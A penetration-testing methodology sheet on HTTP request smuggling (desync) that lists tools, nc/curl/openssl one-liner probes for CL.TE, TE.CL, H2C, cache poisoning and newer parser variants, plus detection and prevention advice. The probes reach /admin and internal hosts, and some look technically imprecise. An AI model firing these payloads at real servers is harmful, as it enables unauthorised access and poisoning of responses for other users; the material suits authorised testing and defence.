# HTTP Request Smuggling (Desync Attacks)

> Comprehensive methodology and one‑liner commands for detecting and exploiting HTTP request smuggling (desync) vulnerabilities, incorporating 2025–2026 trends (Expect:100‑continue + obsolete folding, EXT.TERM/spill variants, HTTP/2 tunneling/header injection, early‑response gadgets, multi‑tenant cache hijacking) and authoritative references (PortSwigger Research, OWASP WSTG INPV‑16, PayloadsAllTheThings).

HTTP Request Smuggling exploits inconsistencies in how front‑end (proxy/CDN/load balancer) and back‑end servers parse HTTP requests — especially ambiguous `Content-Length` (CL) vs `Transfer-Encoding` (TE) handling — allowing attackers to smuggle hidden requests into the request queue. Modern attack vectors include HTTP/2 downgrading, H2C smuggling, browser‑powered desync, and parser discrepancies (funky chunks, EXT.TERM, spill variants).

**Common vulnerable patterns:**
- Dual headers: Both CL and TE present
- Ambiguous chunked encoding (e.g., chunk extensions, line terminators)
- Expect:100‑continue + obsolete folding
- HTTP/2 pseudo‑headers / tunneling
- Multi‑tenant / shared connections

## Tool Installation & Setup

### Burp Suite HTTP Request Smuggler Extension
- Install via Burp's BApp Store: **HTTP Request Smuggler** (v3.0+ 2025+)
- Right‑click request → Smuggle → Scan (auto‑detects CL.TE/TE.CL/TE.TE/H2 with parser discrepancies & timeout confirmation)

### smuggler.py (defparam)
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h
```

### http‑smuggler (CLI alternative)
```bash
npm install -g http-smuggler  # or check project repository
```

### h2csmuggler (Bishop Fox)
```bash
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler
python3 h2csmuggler.py -h
```

### Other Utilities
- **curl** – manual request crafting
- **ffuf** – differential response testing
- **Turbo Intruder** (Burp) – timing attacks

## Testing Commands (One‑Liners)

### Basic Smuggling Detection
```bash
# Scan a list of HTTPS hosts using smuggler.py (quiet mode)
cat https-subs.txt | python3 smuggler.py -q 2>/dev/null | anew smuggling.txt
```

### CL.TE (Front‑end CL, Back‑end TE)
```bash
# Classic CL.TE probe – front‑end sees CL:13, back‑end processes TE chunk 0
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target.com 80
```

### TE.CL (Front‑end TE, Back‑end CL)
```bash
# TE.CL probe – front‑end processes chunked, back‑end stops at CL:4
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n' | nc target.com 80
```

### TE.TE (Obfuscated Transfer‑Encoding)
```bash
# Obfuscate TE header to cause parser disagreement
curl -X POST http://target.com -H 'Transfer-Encoding: chunked' -H 'Transfer-Encoding: xchunked' -d '0\r\n\r\nSMUGGLED'
```

### HTTP/2 Downgrade & H2.CL/H2.TE
```bash
# Use Burp Repeater with HTTP/2 → HTTP/1.1 downgrade enabled
# Manual H2.CL probe (HTTP/2 CL, back‑end HTTP/1.1 CL)
echo -ne 'POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n' | openssl s_client -alpn h2 -connect target.com:443 -ign_eof
```

### H2C (Cleartext HTTP/2) Smuggling
```bash
# Upgrade request with smuggled tail
curl -X POST http://target.com -H 'Connection: Upgrade, HTTP2-Settings' -H 'Upgrade: h2c' -H 'HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA' --data-binary '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
```

### Browser‑Powered Desync (CL.0, Client‑Side Desync)
```bash
# CL.0 probe – front‑end ignores CL, back‑end respects CL
curl -X POST http://target.com -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' -d 'GET /hopefully404 HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### Expect:100‑continue + Obsolete Folding
```bash
# Expect header with folded line to trigger parser discrepancy
curl -X POST http://target.com -H 'Expect: 100-continue' -H 'Content-Length: 30' -H 'Transfer-Encoding:\r\n chunked' --data-binary '0\r\n\r\nSMUGGLED'
```

### Chunk Extensions Abuse (EXT.TERM)
```bash
# Chunk extension with ignored parameter
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n1\r\n;ignored=foo\r\nx\r\n0\r\n\r\n' | nc target.com 80
```

### Double Content‑Length & Header Obfuscation
```bash
# Duplicate CL with different values
curl -X POST http://target.com -H 'Content-Length: 15' -H 'Content-Length: 6' -d 'smuggled'
```

### Early‑Response Gadgets & 0.CL Deadlocks
```bash
# 0.CL deadlock to cause double‑desync for queue poisoning
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc target.com 80
```

### HTTP/2 Tunneling & Header Injection
```bash
# Inject headers via HTTP/2 pseudo‑headers during downgrade
curl --http2-prior-knowledge -X POST https://target.com -H ':method: POST' -H ':path: /' -H ':authority: target.com' -H 'Content-Length: 0' --data-binary 'GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
```

### Multi‑Tenant Cache Hijacking
```bash
# Poison shared cache via smuggled request
curl -X POST http://target.com -H 'Host: target.com' -H 'Content-Length: 35' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nGET /poisoned HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

### Recent CVEs
- **Akamai CVE‑2025‑32094** – Expect:100‑continue + obsolete folding desync
- **ASP.NET Core Kestrel CVE‑2025‑55315** – parser discrepancy in chunked encoding

## Detection & Verification

**Indicators of vulnerability:**
- Differential responses (normal vs smuggled)
- Timeouts / deadlocks (back‑end waits for body)
- Hijacked responses (victim gets attacker's 404/redirect)
- OOB / side‑effects (smuggled request hits internal endpoint)

**Verification steps:**
1. Confirm front‑end/back‑end: Look for `X-Forwarded-For`, `Via`, proxy headers
2. Use Burp HTTP Request Smuggler extension auto‑scan
3. Manual differential testing with `curl` + timing measurements
4. Observe response queue poisoning (send smuggle request, then normal request from another session)

## Prevention Guidance (OWASP Latest)

1. **Normalize requests** – Strip ambiguous headers, enforce single CL or TE
2. **Reject ambiguous requests** – Both CL+TE → 400
3. **Connection isolation** – Terminate/revalidate on parse errors
4. **Proxy hardening** – Strict parsing (Nginx: strict chunked, Apache: mod_proxy strict)
5. **Disable HTTP/1.1** where possible (prefer HTTP/2/3 with proper config)
6. **WAF / rules** – Detect duplicate headers, chunk anomalies
7. **Monitor timeouts/deadlocks** – Alert on connection stalls

## References

- **PortSwigger Research** – [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- **PortSwigger Research** – [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- **PortSwigger Research** – [Browser‑Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- **PortSwigger Research** – [HTTP/1.1 Must Die: The Desync Endgame (2025)](https://portswigger.net/research/http1-must-die)
- **OWASP WSTG INPV‑16** – [Testing for HTTP Request Smuggling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling)
- **PayloadsAllTheThings** – [HTTP Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Request%20Smuggling)
- **Recent CVEs (2025–2026)** – Akamai CVE‑2025‑32094, ASP.NET Core Kestrel CVE‑2025‑55315
